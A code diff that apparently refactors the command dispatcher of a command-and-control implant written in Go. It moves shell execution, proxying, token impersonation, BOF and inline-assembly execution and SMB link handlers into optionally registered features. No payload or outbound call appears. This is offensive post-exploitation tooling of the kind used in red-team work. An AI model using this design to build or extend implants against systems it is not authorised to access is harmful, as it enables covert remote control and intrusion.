@@ -69,15 +69,10 @@ func NewCommandQueue() *WorkQueue {
 	}
 
 	// Register all commands using numeric IDs
-	// Cross-platform commands (SMB_Windows subset)
+	// Register core commands (always available)
 	queue.registerHandler(CmdCd, wrapCommand(&ChDirMsg{}))
 	queue.registerHandler(CmdLs, wrapCommand(&ListDirMsg{}))
 	queue.registerHandler(CmdPwd, wrapCommand(&GetDirMsg{}))
-	queue.registerHandler(CmdDownload, wrapCommand(&FM{}))
-	queue.registerHandler(CmdUpload, wrapCommand(&SendMsg{}))
-	queue.registerHandler(CmdShell, wrapCommand(&ExecMsg{}))
-	queue.registerHandler(CmdSocks, wrapCommand(&ProxyMsg{}))
-	queue.registerHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
 	queue.registerHandler(CmdJobkill, wrapCommand(&WorkStopMsg{}))
 	queue.registerHandler(CmdExit, wrapCommand(&QuitMsg{}))
 	queue.registerHandler(CmdSleep, wrapCommand(&IntervalMsg{}))
@@ -89,26 +84,10 @@ func NewCommandQueue() *WorkQueue {
 	queue.registerHandler(CmdRm, wrapCommand(&RemoveMsg{}))
 	queue.registerHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
 
-	// Windows specific commands
-	queue.registerHandler(CmdToken, wrapCommand(&CredMsg{}))
-	queue.registerHandler(CmdRev2self, wrapCommand(&AuthResetMsg{}))
-	queue.registerHandler(CmdBof, wrapCommand(&TaskRunMsg{}))
-	queue.registerHandler(CmdBofAsync, wrapCommand(&AsyncTaskMsg{}))
-	queue.registerHandler(CmdBofJobs, wrapCommand(&JobListMsg{}))
-	queue.registerHandler(CmdBofOutput, wrapCommand(&TaskOutputMsg{}))
-	queue.registerHandler(CmdBofKill, wrapCommand(&JobStopMsg{}))
-	queue.registerHandler(CmdInlineAssembly, wrapCommand(&NativeRunMsg{}))
-	queue.registerHandler(CmdInlineAssemblyAsync, wrapCommand(&NativeAsyncMsg{}))
-	queue.registerHandler(CmdInlineAssemblyJobs, wrapCommand(&NativeJobsMsg{}))
-	queue.registerHandler(CmdInlineAssemblyOutput, wrapCommand(&NativeOutputMsg{}))
-	queue.registerHandler(CmdInlineAssemblyKill, wrapCommand(&NativeStopMsg{}))
-	queue.registerHandler(CmdInlineAssemblyJobsClean, wrapCommand(&NativeCleanMsg{}))
-	queue.registerHandler(CmdInlineAssemblyJobsStats, wrapCommand(&NativeStatsMsg{}))
-
-	// SMB link commands
-	queue.registerHandler(CmdLink, wrapCommand(&RM{}))
-	queue.registerHandler(CmdUnlink, wrapCommand(&DM{}))
-	queue.registerHandler(CmdLinks, wrapCommand(&RLM{}))
+	// Register optional feature handlers (populated by init() in register_*.go files)
+	for _, reg := range featureHandlers {
+		queue.registerHandler(reg.id, reg.handler)
+	}
 
 	return queue
 }
@@ -252,8 +231,16 @@ func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
 		}
 	}
 
-	// Handle upload chunks
+	// Handle upload chunks (only if upload feature is registered)
 	if cmd.CT == CmdUpload && cmd.Data != "" {
+		if _, exists := cq.cmdHandlers[CmdUpload]; !exists {
+			return &OpResult{
+				Cmd:    cmd,
+				EStr:   Err(E19),
+				EC:     1,
+				Done:   time.Now().Format(time.RFC3339),
+			}, nil
+		}
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
 			return &OpResult{
@@ -267,16 +254,20 @@ func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
 		return result, nil
 	}
 
-	// Handle async BOF commands WITH data
+	// Handle async BOF commands WITH data (only if bof feature is registered)
 	if cmd.CT == CmdBofAsync && cmd.Data != "" {
-		result := cq.processBOFAsync(cmd)
-		return &result, nil
+		if _, exists := cq.cmdHandlers[CmdBofAsync]; exists {
+			result := cq.processBOFAsync(cmd)
+			return &result, nil
+		}
 	}
 
-	// Handle regular BOF commands WITH data
+	// Handle regular BOF commands WITH data (only if bof feature is registered)
 	if cmd.CT == CmdBof && cmd.Data != "" {
-		result := cq.processBOF(cmd)
-		return &result, nil
+		if _, exists := cq.cmdHandlers[CmdBof]; exists {
+			result := cq.processBOF(cmd)
+			return &result, nil
+		}
 	}
 
 	// Handle download continuation
